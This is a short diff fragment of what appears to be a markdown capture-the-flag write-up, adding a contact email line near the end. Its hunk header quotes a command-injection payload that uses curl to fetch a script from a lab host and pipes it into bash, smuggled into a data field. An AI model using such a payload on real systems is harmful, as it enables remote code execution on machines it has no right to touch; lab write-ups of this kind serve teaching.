@@ -174,4 +174,6 @@ true;curl -s http://10.10.X.X:8000/run.sh|bash;#,1,1
 
 </details>
 
+Info & Contact <salvo8253@live.it>
+
 [Torna su](#WriteUp)
